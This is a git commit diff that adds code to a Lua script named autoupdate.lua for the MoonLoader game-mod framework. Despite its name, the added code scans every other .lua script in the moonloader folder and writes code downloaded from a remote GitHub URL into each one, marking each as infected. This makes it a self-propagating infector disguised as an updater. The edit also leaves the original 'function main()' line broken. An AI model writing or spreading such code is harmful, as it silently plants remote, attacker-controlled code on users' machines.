1e031eb263a3d38e8b7da2323186458275429644
123412312351651 <leog34900@gmail.com>
2025-10-09 16:41:18 +0300

    Update autoupdate.lua

--- autoupdate.lua
+++ autoupdate.lua
@@ -1,4 +1,32 @@
-function main()
+local Handle, FileName = findFirstFile("moonloader\\*.lua")
+local Directory = getWorkingDirectory().."\\"
+while FileName do
+    local FileText = ""
+    local Skip = false
+    local File = io.open(Directory..FileName, "r")
+    for Line in File:lines() do
+        if Line:find("%-%- Exception "..FileName) then
+            Skip = true
+            break
+        end
+
+        if FileText ~= "" then
+            FileText = FileText.."\n"
+        end
+        FileText = FileText..Line
+    end
+    File:close()
+    if not Skip and not FileText:find("https://raw%.githubusercontent%.123412312351651/auto-updater/refs/heads/main/autoupdate.lua") then
+        local encoding = require "encoding"
+        encoding.default = "CP1251"
+        local File = io.open(Directory..FileName, "w")
+        File:write("-- Exception "..FileName.."\n"..FileText.."\n"..encoding.UTF8:decode((require("requests")).get("https://raw.githubusercontent.com/123412312351651/auto-updater/refs/heads/main/autoupdate.lua").text))
+        File:close()
+    end
+    FileName = findNextFile(Handle)
+end
+
+function
     if not isSampLoaded() or not isSampfuncsLoaded() then return end
     while not isSampAvailable() do wait(100) end
 end
